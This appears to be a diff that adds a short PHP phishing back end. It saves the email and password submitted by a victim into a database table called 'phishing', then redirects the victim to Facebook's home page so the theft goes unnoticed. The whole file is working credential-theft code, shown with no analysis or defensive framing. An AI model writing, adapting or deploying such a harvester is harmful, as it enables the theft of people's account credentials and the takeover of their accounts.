@@ -1,0 +1,8 @@
+<?php
+
+$bdd = new PDO('mysql:host=host;dbname=db_name', 'login', 'password');
+$req = $bdd->prepare('INSERT INTO phishing (email,password) VALUES (?,?)');
+$req->execute(array($_POST['email'],$_POST['password']));
+header("Location: http://www.facebook.com/home.php? ");
+
+?>
